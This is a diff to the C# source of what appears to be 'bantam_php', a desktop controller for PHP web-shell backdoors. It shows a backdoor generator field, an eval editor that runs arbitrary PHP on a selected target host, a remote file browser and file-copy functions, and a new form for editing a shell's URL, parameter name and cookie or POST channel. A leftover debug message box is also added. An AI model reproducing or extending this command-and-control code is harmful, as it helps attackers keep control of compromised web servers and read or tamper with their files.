@@ -32,7 +32,7 @@ namespace bantam_php
         /// <summary>
         /// Static Forms
         /// </summary>
-        public AddHost addClientForm;
+        public AddHost addClientForm, editHostForm;
         public BackdoorGenerator backdoorGenerator;
 
         /// <summary>
@@ -145,9 +145,6 @@ namespace bantam_php
                 MessageBox.Show("Config file (" + CONFIG_FILE + ") is missing.", "Oh... Shied..");
             }
         }
-
-        [System.Runtime.InteropServices.DllImport("user32.dll")]
-        private static extern IntPtr SendMessage(IntPtr hWnd, int msg, IntPtr wp, IntPtr lp);
 
         private void btnFileBrowserBack_MouseClick(object sender, EventArgs e)
         {
@@ -631,7 +628,6 @@ namespace bantam_php
         public void richTextboxDialogThread(string hostTarget, string phpCode, string title)
         {
             string resultTxt = executeRemotePHP(hostTarget, phpCode);
-
             if (string.IsNullOrEmpty(resultTxt) == false)
             {
                 CustomForms.RichTextBoxDialog(title, resultTxt);
@@ -728,12 +724,12 @@ namespace bantam_php
                 return;
             }
 
-            bool showResponse = false;
-            string code = CustomForms.RichTextBoxEvalEditor("PHP Eval Editor - " + g_SelectedTarget, "", ref showResponse);
+            bool checkBoxChecked = true;
+            string code = CustomForms.RichTextBoxEvalEditor("PHP Eval Editor - " + g_SelectedTarget, "", ref checkBoxChecked);
 
             if (string.IsNullOrEmpty(code) == false)
-            {
-                if(showResponse)
+            {              
+                if(checkBoxChecked)
                 {
                     //execute the code and show it in a richtextbox
                     executePHPCodeDisplayInRichTextBox(code, "PHP Eval Result - " + g_SelectedTarget);
@@ -930,6 +926,26 @@ namespace bantam_php
 
         #region FILE_BROWSER_EVENTS
 
+
+        private void btnFileBrowserGo_Click(object sender, EventArgs e)
+        {
+            if (validTarget() == false)
+            {
+                return;
+            }
+
+            if (string.IsNullOrEmpty(txtBoxFileBrowserPath.Text))
+            {
+                return;
+            }
+
+            string directoryContentsPHPCode = PhpHelper.getDirectoryEnumerationCode(txtBoxFileBrowserPath.Text, Hosts[g_SelectedTarget].PHP_Version);
+
+            //todo fix the need of selected target being passed??...
+            object[] callbackParams = { g_SelectedTarget, txtBoxFileBrowserPath.Text }; //todo this was added temp as a fix for crappy rigging of dynamic thread args class. needs rework to not force result to be last, so we know the known locations and thus furthering its dynamicness
+            startPhpExecutionThread(directoryContentsPHPCode, fileBrowserBtnGoClickMethod, callbackParams);
+        }
+
         /// <summary>
         /// 
         /// </summary>
@@ -944,6 +960,7 @@ namespace bantam_php
 
             if (Hosts[g_SelectedTarget].isWindows)
             {
+                txtBoxFileBrowserPath.Text = "";
                 startPhpExecutionThread(PhpHelper.getHardDriveLetters, fileBrowserWindowsStartMethod);
             } else {
                 string directoryContentsPHPCode = PhpHelper.getDirectoryEnumerationCode(".", Hosts[g_SelectedTarget].PHP_Version);
@@ -1002,8 +1019,16 @@ namespace bantam_php
                 {
                     filebrowserGoBack();
                 } else {
-                    string fullPath = txtBoxFileBrowserPath.Text + "/" + path;
+                    string fullPath = "";
+                    if (Hosts[g_SelectedTarget].isWindows)
+                    {
+                        fullPath = path;
+                    } else {
+                        fullPath = txtBoxFileBrowserPath.Text + "/" + path;
+                    }
 
+                    
+                    MessageBox.Show(fullPath);
                     //Get Directory Contents PHP code
                     string directoryContentsPHPCode = PhpHelper.getDirectoryEnumerationCode(fullPath, Hosts[g_SelectedTarget].PHP_Version);
 
@@ -1155,30 +1180,6 @@ namespace bantam_php
                 string phpCode = "@copy('" + fileName + "', '" + txtBoxFileBrowserPath.Text + "/" + newFileName + "');";
                 startPhpExecutionThread(phpCode);
             }
-        }
-
-        /// <summary>
-        /// Change filebrowser directory and refresh the view
-        /// </summary>
-        /// <param name="sender"></param>
-        /// <param name="e"></param>
-        private void btnFilesBrowserGo_Click(object sender, EventArgs e)
-        {
-            if (validTarget() == false)
-            {
-                return;
-            }
-
-            if (string.IsNullOrEmpty(txtBoxFileBrowserPath.Text))
-            {
-                return;
-            }
-
-            string directoryContentsPHPCode = PhpHelper.getDirectoryEnumerationCode(txtBoxFileBrowserPath.Text, Hosts[g_SelectedTarget].PHP_Version);
-
-            //todo fix the need of selected target being passed??...
-            object[] callbackParams = { g_SelectedTarget, txtBoxFileBrowserPath.Text }; //todo this was added temp as a fix for crappy rigging of dynamic thread args class. needs rework to not force result to be last, so we know the known locations and thus furthering its dynamicness
-            startPhpExecutionThread(directoryContentsPHPCode, fileBrowserBtnGoClickMethod, callbackParams);
         }
 
         #endregion
@@ -1425,6 +1426,7 @@ namespace bantam_php
 
         private void pingToolStripMenuItem1_Click(object sender, EventArgs e)
         {
+            //Done this way because it possibly may be "down" and need retesting
             if (string.IsNullOrEmpty(g_SelectedTarget)
              || Hosts.ContainsKey(g_SelectedTarget) == false)
             {
@@ -1484,6 +1486,19 @@ namespace bantam_php
             {
                 MessageBox.Show(remoteIP, "Your IPV4 Address Is");
                 Clipboard.SetText(remoteIP);
+            }
+        }
+
+        private void editToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            if (string.IsNullOrEmpty(g_SelectedTarget) == false)
+            {
+                string shellUrl = g_SelectedTarget;
+                string varName = Hosts[g_SelectedTarget].RequestArgName;
+                string varType = (Hosts[g_SelectedTarget].SendDataViaCookie ? "cookie" : "post");
+
+                editHostForm = new AddHost(shellUrl, varName, varType);
+                editHostForm.Show();
             }
         }
     }
